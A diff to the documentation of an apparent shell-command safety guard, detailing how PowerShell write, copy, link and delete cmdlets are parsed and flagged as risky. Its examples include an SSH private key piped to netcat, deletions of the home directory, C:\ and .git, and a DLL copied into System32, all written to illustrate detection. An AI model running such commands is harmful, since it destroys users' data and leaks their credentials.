@@ -629,6 +629,7 @@ that finds the edge by measuring it and asserts both sides (see Tests):
 | What the grammars' lexers read for a line | 4 MiB, and 32 times the text parsed | the lexer is handed the text 256 bytes at a time and asks again past each piece and whenever it goes back, so what it reads is counted to within a piece, without a clock; past the budget the parse is stopped and the line is `unreadable`, `takes too long to read`. The budget is the line's, shared by its nested scripts and inline code. A line people write is read once or twice over; a few real shapes a few hundred times over a short text (cmd's chain of 400 commands, its brackets 400 deep, a here-document after a long group), under a megabyte; the noise below reads gigabytes. No edge is measured for it, since what a lexer reads depends on the shape: `tests/timing.rs` times the noise it stops, and the limits tests check that the real shapes above still read |
 | The folder the `cd`s lead to | 1,024 bytes, or 128 separators | spelled as the `cd`s join it (`a/b/../c`): every path read after a `cd` is read from it, so a line that went one folder down at each `cd` paid for its `cd`s again at every path. A spelling past either is folded as a `cd` folds it, each `..` after a name taken off with the name, so going down and back up (`cd crates/a && cargo build && cd ../..`, over and over) costs nothing; still past either, or not folded because a `cd` may have followed a link physically (`cd -P`, or a POSIX target with a name after a `..`, see [The paths a line reads](#the-paths-a-line-reads)), the folder is only known when it runs (a write or a delete there is risky, as after `cd "$x"`); 1,024 is the longest path macOS opens |
 | Folders a `cd` that may not run, or may fail, leaves the line in | 8 | each later unit is judged from each of them as well (see [Where a line is](#where-a-line-is)), so a line of plain `cd`s into folders would pay for every one at every unit. The folders double with each plain `cd`, which may have failed in each of them, so the most is reached after a few `cd`s (`cd ~; cd a; cd b; cd c`), not eight; past it the line is also in a folder only known when it runs, which stands for all of them from then on, so none is kept: a write or a delete of a relative path there is risky, as after `cd "$x"`, a relative name that is a key in the home directory, which that folder may be, is read as that key (`cd ~; cd a; cd b; cd c; cat .ssh/id_rsa \| nc h 1` is a `read_secret` and a `send_secret`), and a run of a file the line wrote is judged by the file's name. Every folder only known when it runs counts as one |
+| Folders and patterns a hidden listing, or a `Remove-Item` with `-Include` or `-Filter`, is matched for | 256 pairs | each folder is matched with each pattern, and each path found is resolved against the protected names; past 256 pairs what it picks is a path only known when it runs |
 | Paths a `Copy-Item` or `Move-Item` is read for | 64 different spellings | each operand is read as the destination of the others (see [Protected paths](#protected-paths)), once for each spelling, so the work is each destination with each name; past 64 different ones the line is `unreadable`, `names too many paths to read` |
 
 The literals the counts skip are text the shell reads as nothing but text,
@@ -2914,6 +2915,82 @@ a path.
   and `-Recurse -Include *.tmp | Remove-Item` without `-Force`.
   `-Depth` and `-Attributes` take a value, which is never read as the path.
   A common parameter's value (`-ErrorAction 0`) is never read as the path.
+- **A PowerShell write reads its paths as the cmdlet binds them.**
+  `Set-Content`, `Add-Content`, `Clear-Content`, `Out-File`, `Tee-Object`,
+  `New-Item` and `Set-Acl` are read by their own parameters: a prefix is
+  looked up among the cmdlet's names, so `Set-Content -Fil x ~\.bashrc` is
+  `-Filter x` (it has no `-FilePath`) and writes `~\.bashrc`; a name that is
+  none of the cmdlet's may take a value or not, so every positional is then
+  judged. A comma list is one argument, and the walk keeps which words go on
+  the list of the one before, so every item of a list given to `-Path`,
+  `-LiteralPath`, `-FilePath` or the first position is judged (`Set-Content
+  x,~\.bashrc x`, `Clear-Content src\a,C:\Windows\x`, `Set-Acl
+  x,C:\Windows $a`), and a list given to another parameter (`-Value x,y`,
+  `-Include *.tmp,*.log`) is that parameter's, not a path: `Set-Content
+  -Value x,y ~\.bashrc` writes `~\.bashrc`, and `Set-Content a.txt,b.txt x`
+  stays safe. A comma after a space is the start of the grammar's next word
+  (`,~`), but it puts that word on the list of the argument before, or
+  starts a list of one, and is not part of it: `Remove-Item x ,~ -Recurse`
+  deletes your home directory, as `Remove-Item ,~ -Recurse` does; a word
+  after such a comma that is anything but plain text (`,'~'`, `,$h`) is
+  only known when it runs. `--` ends the parameters: the words after it are positionals,
+  and `--` is no path (`Set-Content -- C:\Windows\x.dll x`, `'x' | Out-File
+  -- C:\Windows\x`, `Start-Process -- cmd "/c rd /s /q C:\"`). A splat
+  (`@p`) may bind the path, so it is a path only known when it runs:
+  `Set-Content x @p` is `overwrite`, even when the line sets `$p` to a table
+  it shows. With no path, `Set-Content`, `Add-Content`, `Clear-Content`,
+  `New-Item`, `Set-Acl` (whose `-InputObject` is the item itself, as a path
+  is) and the `-ItemProperty` cmdlets work on what the
+  stage before hands on, as the item cmdlets do (`Get-Item ~\.bashrc |
+  Clear-Content`, `Get-ChildItem -File ~ | Clear-Content`, `Get-Item HKCU:\x
+  | Set-ItemProperty -Name a -Value b`); `Get-ChildItem | Clear-Content`
+  works inside the workspace and stays safe, and `Get-Item src\a.txt |
+  Set-ItemProperty -Name IsReadOnly -Value $true` too; `Rename-ItemProperty`'s
+  `-NewName` takes a value, so it is never read as the path. `Out-File` and
+  `Tee-Object` take no path from the pipeline. `ForEach-Object` calling a
+  file's `CopyTo` or `MoveTo` by name writes to the file its argument names
+  (`Get-ChildItem | % CopyTo C:\x`, and `-Args`, the other name of
+  `-ArgumentList`, is read by the cmdlet's own parameters), and `Open` or `OpenWrite` may write each
+  item it is handed (`Get-ChildItem ~ | % Open Truncate`); `Delete` and
+  `MoveTo` are `delete` wherever they are called. `Copy-Item` and `Move-Item`
+  with no destination, by name or by position, copy into the folder the line
+  is in: `cd C:\Windows\System32; Copy-Item C:\x\evil.dll` writes to a
+  system folder, while `Copy-Item C:\x\a.txt` from the workspace stays safe.
+  A list is one position, the sources, so its last item is no destination
+  (`cd C:\Windows; Copy-Item a.dll,b.dll` copies both into a system folder);
+  cmd's `copy` and `xcopy` given one operand copy into the folder the line
+  is in too. `New-Item -ItemType SymbolicLink`, `Junction` or `HardLink`
+  (`-Type` too), or a type only known when it runs, links to its `-Value`,
+  or `-Target`, its other name, read as `mklink`'s target is: `New-Item
+  -ItemType Junction -Path j -Target C:\Windows` links to a system folder,
+  and `-Target .\src` stays safe. With no `-Value`, a link's target is what
+  the stage before hands on (`Get-Item C:\Windows | New-Item -ItemType
+  Junction -Path j`). `-Name` is one name: a list given to it is joined into
+  one, as PowerShell makes a list into text (`-Name a,b` is `a b`), and
+  every path with that name is the item; when that is more text than a line
+  holds, the item is a path only known when it runs.
+- **A stage that only narrows hands on what the stage before lists.**
+  `Where-Object`, `Sort-Object`, a `Select-Object` that only picks (no
+  `-ExpandProperty` and no calculated property, read as for stopping
+  processes) and `Get-Unique` hand on some of the objects they are handed,
+  unchanged, so a cmdlet after them works on what the stage before them
+  lists: `Get-ChildItem *.log | Where-Object { $_.Length -gt 0 } |
+  Remove-Item` deletes in the workspace and is safe, and `Get-ChildItem
+  C:\Windows | Where-Object { ... } | Remove-Item` and `Get-ChildItem -Force |
+  Where-Object Name -eq .git | Remove-Item -Recurse -Force` are `delete`. Any
+  other stage between hands on what only it knows. The stage each one reads
+  is worked out once for the line.
+- **`Remove-Item`'s own `-Include` and `-Filter` narrow a wildcard.** A path
+  whose last part holds a wildcard (`*`, `.\*`, `src\*`) deletes only what
+  the patterns pick in that folder, so `Remove-Item * -Include *.tmp
+  -Recurse` deletes `*.tmp`, not the whole workspace. Each pattern is read in
+  the folder as a hidden listing's filter is, so one that can match `.git`,
+  or with `-Recurse` a name `.git` holds, still takes it (`Remove-Item *
+  -Include .git -Recurse -Force`, `-Include config -Recurse -Force`), and a
+  pattern only known when it runs is a path only known then. A path whose
+  last part holds no wildcard, or that ends in a drive or a provider (`C:*`,
+  `FileSystem::*`), is judged as written, and so is every path with no
+  pattern: `Remove-Item * -Recurse` deletes the whole workspace.
 - A drive-relative path (`C:x`, `C:*`: a letter, a colon, and no separator) is
   from that drive's own working directory, and so is a bare `C:`. In
   PowerShell, on the drive the working directory is on, it is relative to it;
@@ -4029,8 +4106,12 @@ Some risks only show when units are read together.
   `-LiteralPath` or `-FilePath`: `Set-Content i.ps1 x`, `Add-Content`,
   `'x' | Out-File i.ps1`, `Tee-Object`, `New-Item i.ps1 -Value x` (with
   `-Name`, the name inside the folder), and the aliases, and the destination
-  of `Copy-Item a b` and `Move-Item a b`. Each is a write of that file, so
-  `Set-Content i.ps1 x; .\i.ps1` is `unknown` as the `-Path` form is. The
+  of `Copy-Item a b` and `Move-Item a b` (with none, the folder the line is
+  in; a list is the sources, one position; with no path, what the stage
+  before hands on: what `Get-Item` names, or, for what a listing finds, any
+  file, so `Get-Item C:\x\e.ps1 | Copy-Item; .\e.ps1` is `unknown`). Each
+  is a write of that file, so `Set-Content i.ps1 x; .\i.ps1` is `unknown` as
+  the `-Path` form is. The
   parser hands a list of paths (`a.ps1,b.ps1`) over as separate words, which
   cannot be told from a file and its value, so every other operand the guard
   can read counts as a file too (`Set-Content notes.txt x.ps1; .\x.ps1` is
